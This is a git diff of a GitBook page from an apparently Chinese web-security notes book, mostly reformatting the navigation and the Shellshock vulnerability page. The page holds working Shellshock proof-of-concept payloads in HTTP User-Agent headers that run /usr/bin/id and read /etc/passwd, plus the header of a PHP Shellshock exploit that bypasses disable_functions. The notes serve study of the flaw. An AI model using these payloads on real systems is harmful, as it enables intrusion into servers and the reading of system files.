@@ -318,25 +318,12 @@
             
         </li>
     
-        <li class="chapter " data-level="2.1.4.8" data-path="数组的数组和二维数组.html">
+        <li class="chapter " data-level="2.1.4.8" data-path="REQUEST数组.html">
             
-                <a href="数组的数组和二维数组.html">
-            
-                    
-                    数组的数组和二维数组
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="2.1.4.9" data-path="_REQUEST数组.html">
-            
-                <a href="_REQUEST数组.html">
+                <a href="REQUEST数组.html">
             
                     
-                    深入理解_REQUEST数组
+                    REQUEST数组
             
                 </a>
             
@@ -840,7 +827,34 @@
             <ul class="articles">
                 
     
-        <li class="chapter " data-level="2.1.9.1" data-path="包含environ.html">
+        <li class="chapter " data-level="2.1.9.1" data-path="伪协议文件包含.html">
+            
+                <a href="伪协议文件包含.html">
+            
+                    
+                    PHP伪协议
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.9.1.1" data-path="包含日志.html">
+            
+                <a href="包含日志.html">
+            
+                    
+                    包含日志
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.9.1.2" data-path="包含environ.html">
             
                 <a href="包含environ.html">
             
@@ -853,7 +867,7 @@
             
         </li>
     
-        <li class="chapter " data-level="2.1.9.2" data-path="包含临时文件.html">
+        <li class="chapter " data-level="2.1.9.1.3" data-path="包含临时文件.html">
             
                 <a href="包含临时文件.html">
             
@@ -866,7 +880,7 @@
             
         </li>
     
-        <li class="chapter " data-level="2.1.9.3" data-path="包含session文件.html">
+        <li class="chapter " data-level="2.1.9.1.4" data-path="包含session文件.html">
             
                 <a href="包含session文件.html">
             
@@ -876,6 +890,11 @@
                 </a>
             
 
+            
+        </li>
+    
+
+            </ul>
             
         </li>
     
@@ -4009,17 +4028,17 @@
     
                                 <section class="normal markdown-section">
                                 
-                                <h2 id="&#x7834;&#x58F3;&#x6F0F;&#x6D1E;">&#x7834;&#x58F3;&#x6F0F;&#x6D1E;</h2>
+                                <h1 id="&#x7834;&#x58F3;&#x6F0F;&#x6D1E;">&#x7834;&#x58F3;&#x6F0F;&#x6D1E;</h1>
 <p><img src="../images/&#x7834;&#x58F3;&#x6F0F;&#x6D1E;&#x5F71;&#x54CD;&#x8303;&#x56F4;.png" alt="">
 GNU Bash &lt;= 4.3&#xFF0C;&#x6B64;&#x6F0F;&#x6D1E;&#x53EF;&#x80FD;&#x4F1A;&#x5F71;&#x54CD;&#x5230;&#x4F7F;&#x7528;ForceCommand&#x529F;&#x80FD;&#x7684;OpenSSH sshd&#x3001;&#x4F7F;&#x7528;mod_cgi&#x6216;mod_cgid&#x7684;Apache&#x670D;&#x52A1;&#x5668;&#x3001;DHCP&#x5BA2;&#x6237;&#x7AEF;&#x3001;&#x5176;&#x4ED6;&#x4F7F;&#x7528;Bash&#x4F5C;&#x4E3A;&#x89E3;&#x91CA;&#x5668;&#x7684;&#x5E94;&#x7528;&#x7B49;&#x3002;</p>
-<p><a href="https://blog.csdn.net/kobejayandy/article/details/11906505" target="_blank">web&#x670D;&#x52A1;&#x5668;&#x548C;CGI&#x7684;&#x5173;&#x7CFB;</a>
-&#x53C2;&#x8003;&#xFF1A;</p>
+<p><a href="https://blog.csdn.net/kobejayandy/article/details/11906505" target="_blank">web&#x670D;&#x52A1;&#x5668;&#x548C;CGI&#x7684;&#x5173;&#x7CFB;</a></p>
+<h4 id="&#x53C2;&#x8003;">&#x53C2;&#x8003;</h4>
 <ul>
 <li><a href="https://www.cnblogs.com/qmfsun/p/7591757.html" target="_blank">https://www.cnblogs.com/qmfsun/p/7591757.html</a></li>
 <li><a href="https://github.com/vulhub/vulhub/tree/master/bash/shellshock" target="_blank">https://github.com/vulhub/vulhub/tree/master/bash/shellshock</a></li>
 </ul>
-<p><img src="491580-20170926162151276-378081397.png" alt="">
-poc</p>
+<p><img src="491580-20170926162151276-378081397.png" alt=""></p>
+<h4 id="poc">poc</h4>
 <pre><code class="lang-http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/victim.cgi</span> HTTP/1.1
 <span class="hljs-attribute">Host</span>: 127.0.0.1:1235
 <span class="hljs-attribute">User-Agent</span>: () { foo; }; echo Content-Type: text/plain; echo; /usr/bin/id
@@ -4027,7 +4046,7 @@ poc</p>
 <pre><code>User-Agent: () { :;};a=`/bin/cat /etc/passwd`;echo &quot;a: $a&quot;
 User-Agent: () { :;}; echo `/bin/cat /etc/passwd`
 </code></pre><h2 id="php-mail&#x76F8;&#x5173;&#x51FD;&#x6570;&#x53EF;&#x5229;&#x7528;&#x6B64;&#x6F0F;&#x6D1E;">php mail&#x76F8;&#x5173;&#x51FD;&#x6570;&#x53EF;&#x5229;&#x7528;&#x6B64;&#x6F0F;&#x6D1E;</h2>
-<p>poc</p>
+<h4 id="poc">poc</h4>
 <pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span> 
 <span class="hljs-comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) </span>
 <span class="hljs-comment"># Google Dork: none </span>
@@ -4100,7 +4119,7 @@ User-Agent: () { :;}; echo `/bin/cat /etc/passwd`
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"破壳漏洞","level":"2.1.10.1.4","depth":4,"next":{"title":"mod_cgi","level":"2.1.10.2","depth":3,"path":"PHP/mod_cgi.md","ref":"./PHP/mod_cgi.md","articles":[]},"previous":{"title":"魔图漏洞","level":"2.1.10.1.3","depth":4,"path":"PHP/魔图漏洞.md","ref":"./PHP/魔图漏洞.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"PHP/破壳漏洞.md","mtime":"2019-06-19T06:32:43.959Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-07-22T09:32:21.294Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"破壳漏洞","level":"2.1.10.1.4","depth":4,"next":{"title":"mod_cgi","level":"2.1.10.2","depth":3,"path":"PHP/mod_cgi.md","ref":"./PHP/mod_cgi.md","articles":[]},"previous":{"title":"魔图漏洞","level":"2.1.10.1.3","depth":4,"path":"PHP/魔图漏洞.md","ref":"./PHP/魔图漏洞.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"PHP/破壳漏洞.md","mtime":"2019-07-23T08:15:53.411Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-07-23T08:55:46.947Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
